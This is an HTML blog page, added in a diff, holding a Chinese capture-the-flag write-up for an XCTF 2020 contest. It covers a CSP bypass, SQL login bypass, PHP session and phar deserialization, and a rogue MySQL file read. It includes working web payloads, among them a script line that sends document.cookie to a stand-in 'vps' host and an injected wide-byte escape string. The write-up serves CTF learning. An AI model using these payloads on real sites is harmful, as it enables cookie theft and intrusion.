@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="disshu">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="xctf新春防疫赛">
+  <meta property="og:description" content>
+  <meta property="og:site_name" content="disshu">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="disshu" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>disshu</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/disshu.github.io/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/disshu.github.io/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/disshu.github.io//img/cumt.png)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">xctf新春防疫赛</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/disshu.github.io/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/disshu.github.io/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/disshu">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:15695257867@163.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By disshu</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2020-03-11</span>
+            <span class="time">07:02:39</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>太菜了太菜了 把学到的写一下,琐碎的知识点<br>#happyvacation<br>bypass CSP</p>
+<pre><code class="hljs undefined">&lt;meta http-equiv="Content-Security-Policy" content="<span class="hljs-keyword">style-src</span> <span class="hljs-string">'self'</span>; <span class="hljs-keyword">script-src</span> <span class="hljs-string">'unsafe-inline'</span> http://159.138.4.209:1002/; <span class="hljs-keyword">object-src</span> <span class="hljs-string">'none'</span>; <span class="hljs-keyword">frame-src</span> <span class="hljs-string">'self'</span>"&gt;</code></pre>
+
+<p>因为题目存在上传头像的地方，上传采用的是黑名单过滤，可以上传wave文件，wave文件内容如下：<br><code>aaaaaaaaaaaaaaa/*bbbbbbbbbbbbbbbbbbb*/=&#39;test&#39;;window.open(&#39;http://vps/?&#39;+document.cookie);</code><br>即可绕过并获得cookie<br>bypass 宽字节 有引号被转义了<br>通过header设置绕过,宽字节为gbk<br>Content-Type: text/html; charset=GBK;<br>分析<br><code>&lt;body&gt;&lt;script&gt; var a = &#39;{$this-&gt;info-&gt;message}&#39;;document.write(a);&lt;/script&gt;&lt;/body&gt;</code><br>message为%aa’; var xxx=1;//<br>%aa&#39;; var xxx=1;//转义后<br>(urlencode)%aa%5c%27; var xxx=1;//<br>xxx就逃逸出来了</p>
+<h1 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h1><p>这个这是坑,百度有原题<br>账号：admin<br>密码：’-0-‘ ‘-0-’就像个弱密钥 脑洞真大</p>
+<h1 id="Hackme"><a href="#Hackme" class="headerlink" title="Hackme"></a>Hackme</h1><p>session反序列化</p>
+<pre><code class="hljs undefined"><span class="hljs-selector-tag">session_save_path</span>(<span class="hljs-string">'session'</span>);
+<span class="hljs-selector-tag">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php_serialize'</span>);
+<span class="hljs-selector-tag">session_start</span>();</code></pre>
+
+<p>php 键名+竖线（|）+经过serialize()函数处理过的值</p>
+<pre><code class="hljs undefined"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_session</span><span class="hljs-params">($session)</span>
+</span>&#123;
+    <span class="hljs-keyword">foreach</span> ($session <span class="hljs-keyword">as</span> $keys =&gt; $values) &#123;
+        <span class="hljs-keyword">foreach</span> ($values <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;
+            <span class="hljs-keyword">if</span> ($key === <span class="hljs-string">'admin'</span> &amp;&amp; $value === <span class="hljs-number">1</span>) &#123;
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
+            &#125;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+&#125;
+<span class="hljs-keyword">if</span> (check_session($_SESSION)) &#123;
+    <span class="hljs-comment">#变成管理员吧，奥利给</span>
+&#125; <span class="hljs-keyword">else</span> &#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'只有管理员才能看到我哟'</span>);
+&#125;</code></pre>
+
+<p>设置session[admin]=1<br>设置反序列化</p>
+<pre><code class="hljs undefined"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span>
+</span>&#123;
+    <span class="hljs-keyword">public</span> $admin = <span class="hljs-number">1</span>;
+<span class="hljs-comment">//    public $sign;</span>
+&#125;
+
+$kk = <span class="hljs-keyword">new</span> info();
+<span class="hljs-keyword">echo</span> serialize(kk);</code></pre>
+
+<p>传参12123|O:4:”info”:1:{s:5:”admin”;i:1;}就可变成 session 然后去序列化反序列化</p>
+<h1 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h1><p>MySQL客户端任意文件读取<br>如果phpmyadmin开启了如下选项<br>$cfg[‘AllowArbitraryServer’] = true; //false改为true<br>有ip user password option<br>option写MYSQLI_OPT_LOCAL_INFILE<br>ip写vps<br>用户名密码随便<br>在本地运行脚本<br>phar序列化上传</p>
+<pre><code class="hljs undefined">$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"y1ng.phar"</span>);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(<span class="hljs-string">"GIF89a"</span>.<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);
+$phar-&gt;setMetadata($y1ng); 
+$phar-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); 
+$phar-&gt;stopBuffering();</code></pre>
+
+<p>生成后改为gif上传<br>触发目录读取<br><code>phar:///var/www/html/uploads/3c50460b87c42b8e37f102ebdebeda55/16e45eeda7cc58d39621ec8886c53293.gif</code><br>访问phar即可</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/disshu.github.io/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
